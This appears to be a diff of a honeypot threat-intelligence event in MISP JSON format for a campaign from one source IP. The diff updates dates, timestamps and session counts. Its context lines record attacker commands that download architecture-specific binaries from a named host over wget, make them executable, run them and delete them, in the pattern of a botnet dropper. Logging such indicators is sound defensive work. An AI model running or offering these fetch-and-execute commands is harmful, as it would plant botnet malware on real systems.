@@ -2,7 +2,7 @@
   "Event": {
     "uuid": "48d47189-0483-565f-b5a8-06300c057f95",
     "info": "Sundew honeypot - campaign f0ed612071c4 (1 sources) - enable",
-    "date": "2026-09-03",
+    "date": "2026-09-05",
     "analysis": "2",
     "threat_level_id": "3",
     "published": true,
@@ -28,8 +28,8 @@
         "category": "Network activity",
         "to_ids": true,
         "value": "85.165.104.58",
-        "timestamp": "1788433212",
-        "comment": "delivered_payload, confidence high; 14 sessions, 224 commands, 13 downloads; first_seen 2026-08-18T07:14:16.319891Z, last_seen 2026-09-03T02:46:48.747945Z; expires 7d after last_seen"
+        "timestamp": "1788613212",
+        "comment": "delivered_payload, confidence high; 15 sessions, 240 commands, 14 downloads; first_seen 2026-08-18T07:14:16.319891Z, last_seen 2026-09-05T07:23:18.310311Z; expires 7d after last_seen"
       },
       {
         "uuid": "692e42cf-14ae-5ef7-ab36-c003b0d771b6",
@@ -37,7 +37,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "enable",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -46,7 +46,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "system",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -55,7 +55,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "RPMA",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -64,7 +64,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "AMOO",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -73,7 +73,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -82,7 +82,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -91,7 +91,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmpsl; chmod 777 pmpsl; ./pmpsl; rm -rf pmpsl",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -100,7 +100,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm; chmod 777 parm; ./parm; rm -rf parm",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -109,7 +109,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; rm -rf parm5",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -118,7 +118,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm6; chmod 777 parm6; ./parm6; rm -rf parm6",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -127,7 +127,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm7; chmod 777 parm7; ./parm7; rm -rf parm7",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -136,7 +136,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pppc; chmod 777 pppc; ./pppc; rm -rf pppc",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -145,7 +145,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pspc; chmod 777 pspc; ./pspc; rm -rf pspc",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -154,7 +154,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pm68k; chmod 777 pm68k; ./pm68k; rm -rf pm68k",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -163,7 +163,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/psh4; chmod 777 psh4; ./psh4; rm -rf psh4",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       },
       {
@@ -172,7 +172,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm64; chmod 777 parm64; ./parm64; rm -rf parm64",
-        "timestamp": "1788433212",
+        "timestamp": "1788613212",
         "comment": "command run by this campaign"
       }
     ]
